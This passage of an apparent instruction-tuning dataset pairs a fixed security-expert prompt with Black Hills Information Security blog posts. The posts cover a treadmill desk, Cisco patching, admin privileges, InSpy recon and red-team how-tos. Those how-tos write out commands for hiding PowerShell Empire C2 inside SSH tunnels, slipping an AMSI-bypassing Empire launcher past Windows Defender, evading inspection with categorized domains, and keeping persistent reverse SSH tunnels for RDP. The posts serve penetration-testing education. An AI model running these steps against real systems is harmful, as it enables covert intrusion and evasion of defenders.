the miles My goal is to walk 4 miles per day and this has worked well At one point I started competing with my husband and was walking up to 15 miles per day We have since calmed down and keep it to a reasonable number of miles per day I keep my treadmill at the maximum incline setting while I walk I figure this is just extra calories burned and consider it a bonus In fact for every mile I walk I gain 504 feet in elevation That's over 50 flights of stairs every mile I love knowing I'm getting that extra bit of workout in even though I'm walking slow The video below shows the desk in action It starts out at speed 1 and then I increase it to speed 2 I like to work somewhere in-between those two speeds usually Awesome now that's multi-tasking The Chair Now sometimes you just want to sit down right Right My first attempt at solving this problem was a bar stool But it really wasn't very comfortable The stool was at an angle and didn't have a foot rest or a back rest So I ordered a special stool and built a little platform to give the stool a level surface to sit on This was a better but not that great over all I could sit for about 30 minutes before I had a leg going numb Besides that it was a little dangerous I accidently bumped the start button a couple times and was launched off the back of the treadmill while perched atop the stool My husband had come up with a solution where he built a wooden deck that he could rotate down over the treadmill as a platform for an office chair when he didn't want to walk He would then lift his office chair onto the deck when he wanted to sit I didn't love this idea because I didn't want to lift an office chair multiple times a day Instead I asked him to make me a deck on wheels and here it is The deck has fixed non-swivel wheels on the bottom and pushes forward and back very easily even with the office chair on top There is a wooden border around the top edge to keep me from rolling my office chair off the deck It works perfectly and I don't dread the transition from walking to sitting Something to keep in mind is that my head is 3 inches from the ceiling when I stand on the deck Don't turn that ceiling fan on If you are taller you might have to watch your head when climbing into your office chair I love this solution You never realize how good it feels to sit in an office chair until you've sat on a stool for 7 months The Elliptical After I started sitting down I began feeling bad about not exercising To solve this problem I decided to purchase an under desk elliptical machine It took some creativity to figure out how to mount it so it would be out of the way for walking and rolling the deck in This is what I came up with and I like it The pedals rotate out of the way for rolling the deck in and out Once I roll the deck up and sit in the chair I can lower the pedals with my feet and start exercising as shown in the video below There is a tension adjuster you can set for how hard you want your workout to be Unfortunately if you have too much resistance the pedaling can cause your chair to push back This is a bit of a nuisance and I had to install seat belts to deal with this issue I use little bungees mounted to my desk to hold on to the arms of my office chair to keep me from rolling away while pedaling The elliptical comes with a display that can sit on your desk to monitor your progress I like that It makes me feel like I'm getting something done and I can compare my workout to previous days The cord it comes with is not very long but it is a basic aux cord like you use for head phones so a headphone extender cable will get you where you need to go With my treadmill desk and a comfortable sitting while exercising option I'm in heaven However I did discover one more ergonomic issue I had to deal with I woke up one night with my right arm completely numb I had been sleeping on my back and hadn't even been laying on it I was pretty sure that it was the left arm that goes numb during a heart attack so I woke my arm back up and went to sleep Then I woke up again to an ache in my shoulder ball joint and a numb arm again A little Googling and a call to the physical therapist and I knew that I was spending too much time crunched forward over a keyboard I needed to start strengthening my back shoulder muscles to help me keep better posture The Exercise Band To help with strengthening my shoulder blade muscles or whatever it's called I installed an exercise band I keep a timer going that reminds me to do 10 reps with the exercise band on a regular basis Yeah no more shoulder pain with numbness in my arms Other Features It's amazing what just a little bit of exercise does to your body temperature You may have noticed the fan off to the side I have a remote control fan with varying speeds which I use often to cool down while walking I originally had another fan that wasn't remote controlled but it was really annoying to have to reach around to turn it on and off or adjust it Adjustments are required often because when you stop walking and are a little sweaty you quickly get too cold I've also got a ceiling fan light combination with a remote control and the remote is mounted underneath my desk This is handy because heaven forbid I might have to leave my desk Another thing I love about my desk is the 12 outlet power strip I have mounted under my desk as well as the cord trays to keep all those wires organized and off the floor I'm a leg crosser I like to cross my legs when I sit and it annoys me when I can't I know I'm so picky right For my desk I made sure there were no supports holding up the desktop where my legs would hit The image below shows how the desktop is only \u00be of an inch thick where my legs go and the 2x4 supports skirt around this area to avoid being in the way Lastly I'm an addict to screen real-estate I have two wide screen monitors but if I put them side by side my neck gets sore from looking to the side I was able to find an adjustable monitor mount that worked to mount my monitors one above the other The lower one is at an angle so I am looking at it straight on while standing I prefer two monitors over one large monitor because I like how the physical boundary lets me have my virtual machines in full screen mode while still only taking up half my screen real estate Well that's it I hope you've enjoyed your virtual tour of my desk I've included links to various items I've ordered for my desk in case you are interested FitDesk Elliptical Remote Controlled Fan 12 Outlet Power Strip Cable Management Trays Double Monitor Mount We always appreciate when Carrie sends us a guest blog Find her on twitter here Check out a related blog of Carrie's Got Enough Monitors"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Cisco Smart Install Escalation and Update!</title>\n<taxonomies>Author, Blue Team, Jordan Drysdale, Red Team, BlueTeam, Cisco, External Pentest, internal pentest, Inventory, Jordan Drysdale, Nessus, RedTeam, SIET</taxonomies>\n<creation_date>Fri, 21 Dec 2018 19:34:18 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr Both Cisco and Nessus have escalated the Smart Install Client Service feature vulnerability Nessus is now reporting the Smart Install RCE as critical High five Cisco has also packaged up a couple of associated bugs one of which requires a firmware update The first is seen below Reference to this advisory is listed here ools.cisco.com security center content CiscoSecurityAdvisory cisco-sa-20180328-smi2 And the latest update posted on 7-December-2018 lists the service as potentially dangerous and that the best practices configuration would not leave this service lying around for someone to stumble upon While the screenshot and text as seen above suck the point is well received The problem It appears that based on the reference material you will need a SmartNet or equivalent contract to get your hands on the updated software firmware IOS Reference uickview.cloudapps.cisco.com quickview bug CSCvd36820 Good luck and happy patching"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>SSHazam: Hide Your C2 Inside of SSH</title>\n<taxonomies>How-To, Informational, C2, command and control, PowerShell Empire, SSH, SSHazam</taxonomies>\n<creation_date>Tue, 08 Jan 2019 16:04:28 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts SSHazam is a method of running any C2 tool of your choice inside a standard SSH tunnel to avoid network detections The examples here involve running PowerShell Empire which connects to a localhost port on the victim The local port is forwarded to the remote Empire server through an SSH connection so that the only network traffic seen is SSH The victim system in this example is OS X but the same technique could be done on Windows using Plink.exe part of the Putty toolset The image above shows the victim system has an SSH Tunnel configured to listen on port 5430 and forwards anything it receives to the Empire Server The Empire Server has Empire running and listening on the same port on its own localhost 127.0.0.1 5430 To make the SSH traffic blend in a little more we have the SSH server listening on port 443 instead of the standard port 22 Remember to edit your SSH config file to have it listen on this port and also edit your cloud provider firewall to let traffic on this port through You must create or copy a private key to your victim system before establishing the tunnel The associated public key must be added to the authorized_keys file of your empire-server to allow the SSH connection In this example we have put the private key file on the victim machine at .ssh .do.key The following steps will do this for you from the command line assuming you edit it to include your whole private key mkdir .ssh chmod 700 .ssh echo -----BEGIN RSA PRIVATE KEY .ssh .do.key echo MIIJKAIBAAKCAgEArVuMJdwgl9z9s1C0mrYV05hwUevmY CkJaY 1iiPJSE6 AAp .ssh .do.key echo qkMZ9nrHkBQtaQMrXPW5MQXLxU o8LQ5QyPiy B4FiGEfNSx mSJvEYAXXN4zC .ssh .do.key echo RkiQ5Eir83CLCZFLRWV8wFvNkGV2krxMXDtHHFL5ars J7tdBekmYI62eXnE5oXl .ssh .do.key echo NHky2x6YsnQf5lOkC1XyWvwg77gR2kRhb9KpOi hp6xB42o00mpbZgyY5V4 .ssh .do.key echo -----END RSA PRIVATE KEY .ssh .do.key chmod 600 .ssh .do.key To prevent anyone who gains access to the private key from doing unwanted things to your empire-server you can make a configuration change on the Empire Server Specifically edit etc passwd and change the login to bin false victim x 1001 1001 Victim Guy home victim bin false With the private key in place on the victim system one simple command will configure the SSH Tunnel and ports for you ssh -i .ssh .do.key -p 443 -N -f -oStrictHostKeyChecking no victim empire-server.corp.com -L 5430 127.0.0.1 5430 Now you configure PowerShell Empire or your own C2 to listen for connections on 127.0.0.1 5430 This even works when you are doing complex configurations like domain fronting That's it all of your C2 traffic is hidden inside of an encrypted SSH tunnel and you don't have to worry about any other network signatures your C2 may trigger Bonus Material That technique is cool simple and may get you a C2 session in cases where you would otherwise get caught But you may not want to put customer sensitive data on a cloud host you don't own In this case you'll want to set up additional redirectors to forward traffic through the cloud host to the system you own inside your own network This is twice as complex but have no fear I've got it all figured out for you as shown below The C2 connection gets forwarded through the SSH Tunnel to the empire-redirector Firewall rules on the empire-redirector forward the traffic along to another intermediary redirector Lastly your in-house system where the Empire C2 session will ultimately land establishes a reverse SSH connection out to the final redirector The SSH command to run on the victim machine is as follows ssh -i .ssh .do.key -p 443 -N -f -oStrictHostKeyChecking no victim empire-redirector.corp.com -L 5430 127.0.0.1 5431 The SSH command to run from your in-house trusted system is autossh -M 5431 -o ServerAliveInterval 30 -R 5433 10.10.10.185 5430 root redirector.corp.com You may need to install autossh first but it is worth it because it will do the work of making sure your tunnel stays up over long periods of time The IP Table Rules for the Empire-Redirector are as follows iptables -t nat -A OUTPUT -m addrtype --src-type LOCAL --dst-type LOCAL -p tcp -m multiport --dports 5430 65535 -j DNAT --to-destination 128.62.137.184 5432 iptables -t nat -A POSTROUTING -m addrtype --src-type LOCAL --dst-type UNICAST -j MASQUERADE sysctl -w net.ipv4.conf.all.route_localnet 1 This forwards ports 5430 through 65535 on to the final redirector so you can dedicate one port in that range to each victim The IP Table Rules for the Redirector are as follows sysctl -w net.ipv4.conf.all.route_localnet 1iptables -t nat -I PREROUTING -p tcp --dport 5432 -j DNAT --to 127.0.0.1 5433 Whew What a work out It's complex but it does what is required to take those extra steps of precaution keeping sensitive data out of the cloud As a side note I wanted to get a notification via Slack when an SSH connection was made I added these two lines to my etc pam.d sshd file on the empire-redirector to run my Slack notification script each time a successful SSH connection was made session success ok ignore ignore module_unknown ignore default bad pam_selinux.so open session optional pam_exec.so home root ssh-slack-alert.sh My Slack alert script looked like this usr bin env bash if PAM_USER admin PAM_TYPE close_session then message PamType PAM_TYPE nSSH-User PAM_USER nRhost PAM_RHOST nServer SSHazam nHostname hostname curl -X POST --data-urlencode payload channel alerts username SSHazam text message icon_emoji boom ooks.slack.com services YOUR SLACK HOOKHERE fi Note that in this more complex scenario only one victim can connect at a time unless each of your victims is configured to use a different port on the empire-redirector and a different user private-key combination This is annoying but works well in a spear-phishing scenario We love when Carrie guest posts for us Follow her on Twitter OrOneEqualsOne For Penetration Testing Security Assessments Red Team Engagements and Threat Hunting Contact Us"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Small and Medium Business Security Strategies: Part 5</title>\n<taxonomies>Author, Blue Team, How-To, Informational, InfoSec 101, Jordan Drysdale, Blue Team, Defensive Strategies, Jordan Drysdale, Security Strategies, Small Business, Small Business Security</taxonomies>\n<creation_date>Thu, 17 Jan 2019 18:05:30 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Jordan Drysdale tl dr Inventory management and personnel management are critical to making this work Often the difference between your company becoming a statistic and catching someone with a foothold in your network is limiting the privilege of users on your systems If my first check after infecting your systems is whether or not I am a local administrator is successful you are likely hosed If you're just joining this series you can view previous posts here Part 1 IntroductionPart 2 InventoryPart 3 Inventory softwarePart 4 Vulnerability Management CSC 4 Controlled Use of Admin Privileges Putting together the small network management puzzle will require some outside resources assistance help guidance a bit of luck and potentially more We have discussed the Managed IT Provider MSP MSSP roles and how those can aid and I stick to it here A sound MSSP can take a significant burden off your shoulders But for this checkbox Controlled Admin Privilege we need to limit administrative privilege on the network On many large networks the control processes documentation user validation and privileged group membership monitoring is just part of day to day operations That said as the owner operator of a small business limiting user privileges is something that must be part of employee orientation ongoing education and culture It is your responsibility to tell your employees why they do not actually need administrative privilege on your company's systems Let's describe this in terms of risk using the onion analogy Every layer of the onion is a risk Someone sitting at their desk in your office is the outside layer which is easily peeled Once an email link is clicked or credentials are submitted somewhere they shouldn't be the next layer of the onion is your endpoint controls Antivirus application whitelisting and monitoring are the next layers of the onion that have to be peeled back As has been demonstrated over and over these are just layers to be peeled back like the rest The next layer whether or not the user who just clicked to download that Discount Coupon application is an administrator could be the difference between the nightmare scenario of domain compromise or an isolated incident The following image demonstrates the onion from the opposite perspective each layer being your defensible position Fine no users are members of the local administrators group How then do we manage software installs Hopefully your MSSP has a ticketing system and this is something they can do remotely First this provides an opportunity for checks and balances If your process requires executive or manager approval that should happen first Second your MSSP or internal IT admin will install the software Last please gently remind your MSSP not to leave their accounts lying around as locked sessions These sessions are the targets of hackers and pentesters alike If there is a path to these systems they will be pillaged for all they are worth which likely includes the credentials for a highly privileged account Password management ties into about every CSC NIST standard that is defined in some way Managing the privileged account passwords switches access points routers domain administrators also require some thought The following is a list of password managers that can help employees adhere to password policies without resorting to sticky notes Many of them allow the creation and delegation of privileges which can also be revoked at a moment's notice LastPassKeeperZohoSecretServer All these still require some form of authentication so please take extreme caution when managing the One Password To Rule Them All and enable two-factor authentication Along with managing the user privileges on your network's workstations be sure groups like Domain Administrators Enterprise Admins and Schema Admins are well managed and that the members of these groups have been vetted and belong there Another part of policy and procedure implementation is an annual audit and review of those policies Networks do not operate themselves and while they are often neglected they should not be Make your network the associated policies and procedures and your business more secure by playing the governing role As always if you want to see or hear more drop us a line consulting blackhillsinfosec.com"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>I Spy with InSpy v3.0</title>\n<taxonomies>How-To, Password Spray, Recon, Red Team, Red Team Tools, InSpy, password spraying, recon, recon tool, red team tools</taxonomies>\n<creation_date>Mon, 28 Jan 2019 16:34:35 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Darin Roberts Early in 2018 I wrote a blog about InSpy InSpy is a great reconnaissance tool that gathers usernames from LinkedIn My first blog can be found here A few months ago a co-worker mentioned to me that InSpy was now requiring an API key I found out that the updated version did in fact require an API key The version that I initially used was 2.0.2 and the updated version is 3.0.1 Up until the other day I have just used the old version of InSpy on my engagements It has been working and I haven't had any problems Figuring out the latest version has been on my ToDo list and I finally got to it My initial reaction to this was incredulity Why break something that was working I figured that someone was trying to capitalize on a great product trying to get some money from writing a very effective script However upon further review I shouldn't have been so negative The changes made are awesome and I was completely wrong First let's go through the requirements It turns out that the only change to use InSpy is that you need a HunterIO API key HunterIO is another tool that I use on just about every engagement It has great recon information and almost always finds the email pattern for a given company as well as returning multiple email addresses Using HunterIO does require a login but I only use the Free version so my access does not require me to pay any money There are benefits to paying for their service but I haven't done so yet The only thing that you need to do to sign in with hunter.io is an email address Once you are logged in you can get access to your API key Now that we have the API key let's see what we need to do with it On the instructions with InSpy it says we need to put the API key on line 29 of the script Open up the script with your favorite text editor in Linux and find line 29 It looks something like this Put the API key in between the quotes and save the script Running the script is a little different between version 2 and version 3 The following is the command used for employees of Black Hills using version 2.0.2 The following is the script and output from version 3.0.1 The CSV output is very similar However on the output from version 3 there is a third column that contains the email addresses Again this is a handy feature I really like the updates to InSpy I was wary at first but after taking the time to input my already available API key InSpy is more useful than before If you have been using the older version it is definitely worth the update"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>Getting PowerShell Empire Past Windows Defender</title>\n<taxonomies>C2, How-To, Informational, Red Team, Red Team Tools, .Net, Carrie Roberts, PowerShell, PowerShell Empire, Red Team, Windows 10, Windows Defender</taxonomies>\n<creation_date>Fri, 15 Feb 2019 22:03:09 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts Updated 2 12 2020 ADVISORY The techniques and tools referenced within this blog post may be outdated and do not apply to current situations However there is still potential for this blog entry to be used as an opportunity to learn and to possibly update or integrate into modern tools and techniques Note Windows Defender added a detection on 2 25 2019 which now detects this method as AmsiTamper.A Windows Defender does a good job of blocking many attacks including attempts to establish Command Control C2 sessions with published tools like PowerShell Empire I was recently looking for a way to establish such a C2 session on a Windows 10 computer with Windows Defender enabled I found a project called SharpSploit by Ryan Cobb that did the trick SharpSploit combines a lot of other important work by other security researchers into one tool and creates a C2 session with C code instead of using PowerShell.exe This technique helps to avoid some common detections around malicious PowerShell activity Of particular interest to our goal at hand is the PowerShellExecute method described in the SharpSploit Quick Command Reference Cool It uses Matt Graeber's mattifestation AMSI bypass and Lee Christensen's tifkin_ PowerShell logging bypass too That's handy The key piece here for bypassing Windows Defender with our payload is the AMSI bypass Now to get started getting that PowerShell Empire payload past Anti-Virus solutions like Windows Defender We are going to use SharpGen also developed by Ryan Cobb as a way to package up the SharpSploit functionality we want inside of an executable file Before building this executable you will need to install the .NET Core SDK which you can find here Windows Defender does not get a warm and cozy feeling about the files in the SharpGen github repo If you are crafting your C2 on a system with Windows Defender you should add a folder to the exceptions list in the Windows Defender settings From within this folder you can work with the SharpGen code without interference Now pull down the SharpGen code from github into the folder you added to Windows Defender's exceptions list You can use Git For Windows to run this command git clone ithub.com cobbr SharpGen.git By default SharpGen bundles PowerKatz into the final executable which will still get blocked by Windows Defender Since our goal is not to run Mimikatz we will disable it by editing the resources.yml in the SharpGen Resources and changing the enabled field for all PowerKatz related entries to false After ensuring that each Enabled field is set to false in the resources.yml file we are ready to build the SharpGen DLL cd SharpGen The following produces a bin Release netcoreapp2.1 directory with the SharpGen.dll file we need for the next step dotnet build -c Release For a simple example we will first build an executable that prints hi to the screen using Write-Output dotnet bin Release netcoreapp2.1 SharpGen.dll -f example.exe -d net40 Console.WriteLine Shell.PowerShellExecute Write-Output hi You will now find the executable to run on your victim system in the Output folder The -d net40 option in the command above targets .Net 4.0 Then you can change this to -d net35 to target .Net 3.5 if this is what your victim system is running Running our example.exe will simply print hi to the screen If you run the executable by clicking on it this will happen so fast you won't even see it I recommend you run the executable from cmd.exe as shown below so you can see the output Our initial goal can be accomplished by building an executable that will run a PowerShell one-liner to establish a C2 connection with Empire We generate the one-liner using the multi launcher stager in PowerShell Empire some hints on how to do that here All we need is the resulting base64 string to copy and paste into the following command dotnet bin Release netcoreapp2.1 SharpGen.dll -f Launcher.exe -d net40 Console.WriteLine Shell.PowerShellExecute c System.Text.Encoding Unicode.GetString System.Convert FromBase64String invoke-expression -command c Replace with the base64 string output produced by Empire's multi launcher the stuff after powershell -noP -sta -w 1 -enc including any equals signs at the end You will find Launcher.exe in the Output directory Move this to your victim system and voila You have gotten past Windows Defender However in a corporate environment this is probably not the only defense you need to get past For example there may be network defenses that will inspect the network traffic and shutdown the communication Here are some tips for success Use HTTPS communications over port 443 using valid not self-signed certificates More information on how to set this up with Empire is located here Change any default values like DefaultJitter and DefaultProfile when starting your Empire Listener Use an aged not recently purchased and categorized domain In fact if you use a domain that is categorized as Government Health Care or Financial you might even avoid getting your traffic decrypted and inspected Detect-SSLmitm is a PowerShell script that you can run on the victim system to determine which websites are being SSL decrypted If you find that sites categorized as financial are not being decrypted use a domain from that category You can buy a domain host some believable pages on it and apply for categorization time-consuming Or you can buy a domain that has already been categorized but is now available for purchase A tool like Domain Hunter Joe Vest joevest Andrew Chiles andrewchiles can help you locate such a domain If application whitelisting is in play and preventing you from running random executables try one of many application whitelisting bypasses Here is one example by fullmetalcache that I've used successfully in the past Thanks to Carrie for another awesome guest blog post here on the BHIS Blog For Penetration Testing Security Assessments Red Team Engagements and Threat Hunting Contact Us"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>I'm Resigning From SANS</title>\n<taxonomies>Author, Informational, John Strand, john strand, SANS, SEC504</taxonomies>\n<creation_date>Wed, 20 Feb 2019 14:08:22 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Not sure what am I doing here with my hands John Strand Hello all Well this is a painful post to write so I will get right to it I am on my last run of classes with the SANS Institute And this is a good thing It is a good thing for SANS SEC504 it is a good thing for me my family and my company The management of SANS Ed and I have been talking about me moving on for about a year But first let me backup a bit I started teaching for SANS a long long time ago I think it was about 15 years with the mentor program I worked myself up through the ranks working under amazing people like Scott Weil Stephen Northcutt Mike Poor and Ed Skoudis I was strongly encouraged by all of them to do something outside of SANS In fact Stephen once came up to me and said if he ever heard that I was only teaching for SANS I would be fired immediately His point was that he wanted people who were active in the fields they were teaching I took that to heart So I started BHIS and started building a team All the while trying my best to emulate Ed Skoudis and Mike Poor when they founded InGuardians This worked very well Then a few years back Chris Brenton Paul and I started Active Countermeasures That is starting to take off as well Basically it has gotten to the point that I need to be able to spend more time with my family and the companies we have started Does this mean I am done with SANS No not even close I am going to shepherd SANS SEC504 through this process to another author and I will continue to present at SANS through webcasts Does this mean I am done teaching No not even close I will continue to do webcasts with SANS and BHIS far into the future Also I will continue to teach Active Defense and Cyber Deception at Black Hat ww.blackhat.com us-19 training schedule index.html a-guide-to-active-defense-cyber-deception-and-hacking-back-14124 Will I never get a chance to see you in SEC504 Depends below is a list of the final classes I will teach for SEC504 ww.sans.org instructors john-strand And it should also be noted that Josh Wright will be taking over SEC504 Which is great news for everyone Check him out here witter.com joswr1ght I would also like to take a moment to point out that part of the timing of this is because the SEC504 instructor corps is very very strong The people teaching SEC504 right now are the strongest group of instructors I have ever seen It makes stepping away that much easier when you know that things will go on without you The list of upcoming SEC504 classes can be found on the following link and all of the instructors teaching are amazing ww.sans.org course hacker-techniques-exploits-incident-handling I also wanted to write this as an official and public thanks to the entirety of SANS All of the instructors the management and the staff have helped me become the security professional I am today For that I am grateful As for the students everything I have done and continue to do is to help ensure that SANS SEC504 is the greatest class you have ever taken not just in the classroom but through the presentations blogs and webcasts as well Thanks John Strand"
    },
    {
        "input": "",
        "instruction": "You are an information security expert and have deep technical knowledge\nin the information security domain. You have the extensive knowledge of\nan experienced senior information security consultant.\nYou thoroughly understand a diverse amount of information security concepts including encryption, hashing,\nrisk analysis, penetration testing, red teaming, purple teaming,\nweb application testing, source code analysis, internal and external network testing.\n\nTake a step back and think step-by-step about how to achieve the best possible results.\nProvide a response to the input provided using one of the options below.\n\n\n<title>The RDP Through SSH Encyclopedia</title>\n<taxonomies>External/Internal, How-To, Informational, Red Team, BHIS, Black Hills Information Security, Carrie Roberts, RDP, SSH</taxonomies>\n<creation_date>Thu, 28 Feb 2019 16:20:19 +0000</creation_date>\n\n1. Summarize the blog post.\n2. Answer questions about the blog post.\n3. Provide detailed technical explanations from the blog post.\n",
        "output": "Carrie Roberts I have needed to remind myself how to set up RDP access through an SSH connection so many times that I've decided to document it here for future reference I hope it proves useful to you as well I do adversary simulation for work and so I present this information using terms like attacker and target but this info is also useful for performing system administration tasks The first scenario we will cover is the situation where you have access to a Linux machine on an Internal network and you want to RDP to a Windows machine on that same internal network This might be the case if you have placed a Dropbox on the internal network e.g a Raspberry Pi computer plugged into an ethernet port on the internal network Or perhaps you have access to execute commands on a Linux machine that already exists on the Internal Network In either case you can use the following technique to RDP to your target on the Internal Network The following diagram shows the starting point for this scenario Here we have the Attacker system on one Internal network that is not accessible from the internet The attacker operating system is Windows Next we have a Linux computer on the internet e.g a Digital Ocean Droplet We refer to this system on the Internet as the External system The External system has an IP address of 208.8.8.8 in this example and it has the SSH service listening on port 443 The red box on the outside of the gray box indicates that the port port 443 is listening on the external interface Listening on the external interface means that other remote systems can connect to it The red box is shown twice just for clarity in later connection steps but there is really only one port 443 listening We the Attacker have full control of both the Attacker and External machines Moving to the Target Internal network we have a Dropbox Linux where we have the ability to execute commands The Dropbox has the SSH service listening on port 22 allowing other systems on the network to interact with it Lastly we have the Target Windows system that we want to RDP to The Target has RDP enabled and listening on port 3389 and we have credentials for a user that is allowed to RDP to this machine The IP address of the Target is 10.2.2.222 in this example All SSH authentication in this tutorial will be done using public private key pairs It is assumed that the Dropbox has a private key file called db.key and that the public key db.pub has been added to the authorized_keys file on the External server It is also assumed that the Attacker system is set up in a similar manner using a private key called at.ppk or at.key and that the public key for this is added to the authorized_keys file on both the External and Dropbox systems You will need to use the ppk version of the private key for the examples that use PuTTY plink as the SSH client If your key pair was generated on Linux you can use the PuTTYgen tool to convert the private key to the ppk format The first step we will take is to connect the Dropbox to the External system via SSH Because internal networks are not accessible from the Internet the connection will have to be initiated from the Dropbox itself We could connect the Dropbox to the External system with the following SSH command ssh -i .ssh db.key -p 443 root 208.8.8.8 Now we have a connection tunnel from the Dropbox to the External system The arrow shows the direction of the connection However this isn't quite what we want We want to be able to forward an RDP connection through this tunnel we just set up To do this we will tell SSH to start listening on an internal port port 5001 and forward anything that connects to this internal port back through our SSH Tunnel This is known as Reverse SSH Port Forwarding It is Reverse because the listening port is being created on the system we are SSH'ing to and not on the system we are SSH'ing from The following command will set up the Reverse SSH Port Forward for us In this command the term localhost is referring to the Dropbox which has the SSH service listening on port 22 ssh -i .ssh db.key -p 443 -R 5001 localhost 22 root 208.8.8.8 A green box around a port number designates that this port is listening on the local interface only This port is not accessible by remote systems except through an SSH tunnel A note on persistence You may want to make sure that this SSH tunnel from the Dropbox to the external system stays connected For example you may have left the Dropbox on-site and no longer have command line access to it without using the tunnel In this case you should consider using the autossh command as shown below If autossh is not installed you can follow the instructions here to install it autossh -M 0 -o ServerAliveInterval 30 -o ServerAliveCountMax 3 -o ExitOnForwardFailure yes -i .ssh db.key -p 443 -R 5001 localhost 22 root 208.8.8.8 Autossh is used to monitor and restart SSH sessions The -M 0 option disables the monitoring port and instead uses the two Alive options to check the health of the connection The ExitOnForwardFailure means that if autossh can't bind to the remote port 5001 in this case it will exit This will make it obvious that the full connection we are seeking has not occurred If you are worried that the Dropbox may get restarted and you want to ensure that the SSH tunnel gets restarted you could install it as a service This can be accomplished by creating the following file at etc systemd system autossh.service and then registering it as a service Remember to replace 208.8.8.8 with the IP of your External server Unit Description Keeps a tunnel to External server openRequires network-online.targetAfter network-online.target Service User rootEnvironment AUTOSSH_GATETIME 0 ExecStart usr bin autossh -M 0 -N -o ServerAliveInterval 30 -o ServerAliveCountMax 3 -o ExitOnForwardFailure yes -i root .ssh db.key -p 443 -R 5001 localhost 22 root 208.8.8.8 Install WantedBy multi-user.target The following commands will read the new autssh.service file start the service and check its status sudo systemctl daemon-reloadsudo systemctl start autossh.servicesudo systemctl status autossh.service Ensure that the status shows as active running as shown in the image below Finally set the service to start at boot and make sure the SSH service also starts at boot sudo systemctl enable autossh.servicesudo systemctl enable ssh Now you can try rebooting your Dropbox and confirm that the tunnel out to the External service is up and functional including the reverse port forward back to the Dropbox The Dropbox is connected now let's connect the Attacker system to the External System First we will set up two environment variables to make the final command easy to copy and paste Replace the IP addresses in these two commands with the IP address of your External server and the Internal IP of the Target system Run these commands from a cmd window on the Attacker system set EXTERNAL_IP 208.8.8.8set TARGET_IP 10.2.2.222 Now in the same window where you set the above environment variables run the following command Run this command from the directory that contains your attacker private key at.ppk If your key was generated in Linux you can use Puttygen.exe to open the key and save it out in ppk format If you run this command from a different directory than where your at.ppk file is you'll need to provide the full path to the file such as c Users admin .ssh at.ppk in both locations it is referenced in the command plink -i at.ppk root EXTERNAL_IP -P 5001 -L 3390 TARGET_IP 3389 -proxycmd plink root EXTERNAL_IP -P 443 -i at.ppk -nc 127.0.0.1 5001 If you get an error that plink is not recognized as an internal or external command copy plink.exe to the same directory you are running the command from e.g your .ssh directory To understand what this command is doing we really need to look at it in reverse order The first thing that happens is the command that follows -proxycmd is executed The proxycmd portion of the command is shown below plink root EXTERNAL_IP -P 443 -i at.ppk -nc 127.0.0.1 5001 The state of our connection after just this proxycmd runs is shown below The -nc portion of the command tells plink to open a tunnel to 127.0.0.1 port 5001 instead of a session Next we look at the first half of the plink link command This actually runs after the proxycmd shown above plink -i at.ppk root EXTERNAL_IP -P 5001 -L 3390 TARGET_IP 3389 This SSH connection is established through the tunnel previously created with proxycmd This is why it has access to the internal port listening on port 5001 The last part of the command uses the Local Port Forward option -L to send anything connecting to local port 3390 through the tunnel to port 3389 on the Target After the full command runs this is what we have created Note that we chose local port 3390 because Windows complains with a Your computer could not connect to another console error as shown below if you try to connect to localhost 3389 with the RDP client Finally we can now RDP from our Attacker system to the Target system with the Windows built-in 